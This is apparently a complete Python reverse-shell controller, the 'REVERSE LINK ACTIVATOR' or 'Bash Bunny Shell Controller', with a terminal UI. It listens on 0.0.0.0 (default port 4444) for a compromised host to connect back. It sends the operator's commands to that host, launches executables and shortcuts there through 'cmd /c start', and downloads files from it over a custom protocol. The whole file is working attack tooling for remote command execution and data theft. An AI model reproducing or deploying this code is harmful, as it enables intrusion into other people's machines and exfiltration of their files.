import socket
import shutil
import os
import sys
import time
import platform

def clear_screen():
    """Clear the terminal screen with compatibility for different platforms."""
    if platform.system() == "Windows":
        os.system("cls")
    else:
        # More reliable clear for Unix systems
        print("\033c", end="")

def move_cursor(x, y):
    """Move cursor to specified position with fallback for terminals that don't support ANSI."""
    try:
        sys.stdout.write(f"\033[{y};{x}H")
        sys.stdout.flush()
    except:
        # Fallback if ANSI escape sequences fail
        pass

def print_inside(x, y, text):
    """Print text at specified position with error handling."""
    try:
        move_cursor(x, y)
        sys.stdout.write(text)
        sys.stdout.flush()
    except:
        # Fallback if positioning fails
        print(text)

def draw_box(x, y, width, height, title=""):
    # Using simpler box drawing characters for better terminal compatibility
    title_text = f"[ {title} ]"
    if len(title_text) >= width - 4:
        title_text = title_text[:width - 4]
    side_len = (width - 2 - len(title_text)) // 2
    extra = (width - 2 - len(title_text)) % 2
    
    # Simple ASCII box style
    top = "+" + "-" * side_len + title_text + "-" * (side_len + extra) + "+"
    print_inside(x, y, top)
    
    for i in range(1, height - 1):
        print_inside(x, y + i, "|" + " " * (width - 2) + "|")
    
    print_inside(x, y + height - 1, "+" + "-" * (width - 2) + "+")

def get_port(x, y):
    while True:
        try:
            # Clear previous input area
            print_inside(x, y, " " * 50)
            print_inside(x, y + 1, " " * 50)
            
            # Show input prompt
            print_inside(x, y, "Enter the port to listen on: ")
            
            # Move cursor to input position (after the colon and space)
            move_cursor(x + len("Enter the port to listen on: "), y)
            sys.stdout.flush()
            
            # Get port input
            port_input = input()
            
            # If input is empty, use a default port
            if not port_input.strip():
                return 4444  # Default port
            
            port = int(port_input.strip())
            if 1 <= port <= 65535:
                return port
            else:
                print_inside(x, y + 1, "[!] Invalid port. Must be 1–65535." + " " * 20)
                time.sleep(1.5)
        except KeyboardInterrupt:
            print_inside(x, y + 2, "[!] Port selection interrupted. Exiting." + " " * 20)
            exit(0)
        except Exception as e:
            print_inside(x, y + 1, f"[!] Invalid input: {str(e)[:30]}" + " " * 20)
            time.sleep(1.5)

def start_listener():
    clear_screen()
    
    # Get terminal size
    cols, rows = shutil.get_terminal_size()
    
    # Adjust sizes based on terminal
    box_width = cols  # Use the full width of the terminal
    top_x = 0  # Start at the very left
    top_y = 2
    top_height = 5
    
    # Initial position for command input (will be updated later)
    shell_y = top_y + top_height + 1
    cmd_input_y = shell_y + 10 + 1  # Initial value, will be adjusted
    
    # Set terminal title if possible
    if os.name == "posix":
        sys.stdout.write("\033]0;REVERSE: Reverse Shell Controller\007")
        sys.stdout.flush()

    draw_box(top_x, top_y, box_width, top_height, "REVERSE LINK ACTIVATOR")
    port = get_port(top_x + 2, top_y + 2)

    shell_y = top_y + top_height + 1
    log_lines = []
    shell_box_height = 10  # Starting height
    max_log_lines = shell_box_height - 4  # Reserve 4 lines for borders and spacing
    
    # Connection status line position (between boxes)
    conn_status_y = shell_y - 1

    def redraw_shell_box():
        nonlocal shell_box_height, max_log_lines, cmd_input_y

        # Calculate required height based on log lines (minimum 10)
        required_height = min(max(10, len(log_lines) + 4), rows - shell_y - 3)

        if required_height != shell_box_height:
            shell_box_height = required_height
            max_log_lines = shell_box_height - 4

        # Update command input position
        cmd_input_y = shell_y + shell_box_height + 1

        # Clear the output area (from shell_y to bottom of terminal)
        for i in range(shell_y, shell_y + shell_box_height + 5):
            print_inside(top_x, i, " " * box_width)

        # Draw the console box
        draw_box(top_x, shell_y, box_width, shell_box_height, "REVERSE SHELL CONSOLE")

        # Display the log lines with proper wrapping
        display_lines = log_lines[-max_log_lines:] if log_lines else []
        wrapped_lines = []
        for line in display_lines:
            # Wrap lines that are too long for the box
            while len(line) > box_width - 6:
                wrapped_lines.append(line[:box_width - 6])
                line = line[box_width - 6:]
            wrapped_lines.append(line)

        # Display the wrapped lines
        for i, line in enumerate(wrapped_lines[-max_log_lines:]):
            padding = " " * (box_width - 6 - len(line))
            print_inside(top_x + 3, shell_y + 2 + i, line + padding)

    # Initial shell box setup
    redraw_shell_box()

    # Display listening status
    status_text = f"STATUS: Listening on 0.0.0.0:{port}..."
    print_inside(top_x, conn_status_y, status_text + " " * (box_width - len(status_text)))
    
    try:
        # Setup socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", port))
        server_socket.listen(1)
        
        # Add to log
        log_lines.append(f"[+] Listening on 0.0.0.0:{port}...")
        redraw_shell_box()
        
        # Wait for connection with animation
        wait_chars = ["-", "\\", "|", "/"]
        wait_idx = 0
        server_socket.settimeout(0.3)
        
        connected = False
        while not connected:
            try:
                # Show waiting animation
                print_inside(top_x + len(status_text) + 1, conn_status_y, wait_chars[wait_idx])
                wait_idx = (wait_idx + 1) % len(wait_chars)
                
                # Check for connection
                conn, addr = server_socket.accept()
                connected = True
            except socket.timeout:
                continue
            except KeyboardInterrupt:
                log_lines.append("[!] Listener canceled by user. Exiting.")
                redraw_shell_box()
                return
        
        # Reset socket timeout
        server_socket.settimeout(None)
        
        # Connection established
        conn_msg = f"CONNECTION FROM {addr[0]}:{addr[1]}"
        print_inside(top_x, conn_status_y, conn_msg + " " * (box_width - len(conn_msg)))
        
        log_lines.append(f"[+] Connection from {addr[0]}:{addr[1]}")
        redraw_shell_box()
        
        # Handle client connection
        with conn:
            try:
                # Try to get initial metadata from client
                conn.settimeout(2.0)
                try:
                    metadata = conn.recv(2048).decode(errors='ignore').strip()
                    if metadata:
                        log_lines.append(f"[Client]: {metadata}")
                        redraw_shell_box()
                except:
                    pass
                
                # Reset timeout
                conn.settimeout(None)
                
                # Main command loop
                while True:
                    try:
                        # Shell prompt outside the box with more visible formatting
                        prompt_text = "Shell> "
                        print_inside(top_x, cmd_input_y, prompt_text + " " * (box_width - len(prompt_text)))
                        sys.stdout.flush()
                        # Move cursor after the prompt text
                        move_cursor(top_x + len(prompt_text), cmd_input_y)
                        sys.stdout.flush()
                        
                        # Get command
                        command = input()
                        
                        # Handle file download
                        if command.startswith("download "):
                            filepath = command[len("download "):].strip().strip('"')
                            conn.sendall(f"__download__::{filepath}\n".encode())

                            # Receive header: OK or ERROR
                            header = conn.recv(1024).decode(errors='ignore')
                            if header.startswith("__error__::"):
                                log_lines.append(f"[!] Download error: {header.split('::',1)[1]}")
                                redraw_shell_box()
                                return
                            elif not header.startswith("__begin_file__"):
                                log_lines.append("[!] Unexpected response during download.")
                                redraw_shell_box()
                                return

                            # Prepare to save file
                            save_name = os.path.basename(filepath)
                            with open(save_name, "wb") as f:
                                while True:
                                    chunk = conn.recv(4096)
                                    if b"__end_file__" in chunk:
                                        f.write(chunk.replace(b"__end_file__", b""))
                                        break
                                    f.write(chunk)
                            log_lines.append(f"[+] File saved as: {save_name}")
                            redraw_shell_box()
                            continue  # Skip normal execution

                        # Handle exit command
                        if command.strip().lower() == "exit":
                            conn.sendall(b"exit\n")
                            log_lines.append("[!] Session terminated.")
                            redraw_shell_box()
                            break
                        
                        # Check for special execution commands
                        if ".url" in command or ".lnk" in command:
                            # For shortcut files, use the proper syntax
                            # Extract the filename part without adding explorer
                            clean_command = command.strip('"').strip("'")
                            if not clean_command.startswith("cmd /c start"):
                                command = f'cmd /c start "" "{clean_command}"'
                            log_lines.append(f"[*] Launching shortcut: {clean_command}")
                        elif any(ext in command.lower() for ext in [".exe", ".bat", ".cmd"]):
                            # For executable files, use cmd /c start with empty title
                            clean_command = command.strip('"').strip("'")
                            if not clean_command.startswith("cmd /c start"):
                                command = f'cmd /c start "" "{clean_command}"'
                            log_lines.append(f"[*] Executing program: {clean_command}")
                        
                        # Log the command
                        log_lines.append(f"$ {command}")
                        redraw_shell_box()
                        
                        # Send command (no need for special handling here anymore)
                        conn.sendall((command + "\n").encode())
                        
                        # Show "Waiting for response..." message
                        status_msg = f"STATUS: [*] Waiting for response from {addr[0]}..."
                        print_inside(top_x, conn_status_y, status_msg + " " * (box_width - len(status_msg)))
                        
                        # Initialize wait_start time (fixing the undefined variable issue)
                        wait_start = time.time()
                        
                        # Collect response data
                        data = b""
                        while True:
                            try:
                                conn.settimeout(0.2)  # Short timeout for response
                                chunk = conn.recv(4096)
                                if not chunk:
                                    break
                                data += chunk
                            except socket.timeout:
                                # Stop waiting if no data is received after a short timeout
                                if len(data) > 0:
                                    break
                                elif time.time() - wait_start > 10.0:  # 10-second timeout
                                    break
                        
                        # Reset status
                        print_inside(top_x, conn_status_y, conn_msg + " " * (box_width - len(conn_msg)))
                        
                        # Process response
                        output = data.decode(errors='ignore').strip()
                        if output:
                            log_lines.extend(output.splitlines())
                        else:
                            log_lines.append("[.] No output received.")
                        
                        # Update display
                        redraw_shell_box()
                        
                    except KeyboardInterrupt:
                        log_lines.append("[!] Session manually interrupted.")
                        redraw_shell_box()
                        break
                    except Exception as e:
                        log_lines.append(f"[!] Error: {str(e)}")
                        redraw_shell_box()
                        break
            
            except Exception as e:
                log_lines.append(f"[!] Connection error: {str(e)}")
                redraw_shell_box()
    
    except Exception as e:
        print_inside(top_x, conn_status_y, f"ERROR: {str(e)}")
    
    finally:
        # Clean exit message
        print_inside(top_x, cmd_input_y + 2, "Press Enter to exit...")
        input()

def print_banner():
    """Print a stylish banner for the Bash Bunny Reverse Shell tool."""
    clear_screen()
    
    # Get terminal dimensions
    cols, rows = shutil.get_terminal_size()
    
    # Define the banner
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║     █▄▄▄▄ ▄███▄      ▄   ▄███▄   █▄▄▄▄   ▄▄▄▄▄   ▄███▄       ║
    ║     █  ▄▀ █▀   ▀      █  █▀   ▀  █  ▄▀  █     ▀▄ █▀   ▀      ║
    ║     █▀▀▌  ██▄▄   █     █ ██▄▄    █▀▀▌ ▄  ▀▀▀▀▄   ██▄▄        ║
    ║     █  █  █▄   ▄▀ █    █ █▄   ▄▀ █  █  ▀▄▄▄▄▀    █▄   ▄▀     ║
    ║       █   ▀███▀    █  █  ▀███▀     █             ▀███▀       ║
    ║      ▀              █▐            ▀                          ║
    ║                     ▐                                        ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    # Split the banner into lines
    banner_lines = banner.splitlines()
    banner_height = len(banner_lines)
    
    # Calculate vertical and horizontal centering
    vertical_padding = (rows - banner_height) // 2
    horizontal_padding = cols // 2
    
    # Print vertical padding (empty lines)
    print("\n" * vertical_padding, end="")
    
    # Center each line horizontally
    for line in banner_lines:
        print(line.center(cols))
    
    time.sleep(1.5)

if __name__ == "__main__":
    try:
        print_banner()
        start_listener()
    except KeyboardInterrupt:
        clear_screen()
        print("\nExiting Bash Bunny Shell Controller...")
        time.sleep(0.5)
    except Exception as e:
        print(f"\nAn error occurred: {str(e)}")
        print("Press Enter to exit...")
        input()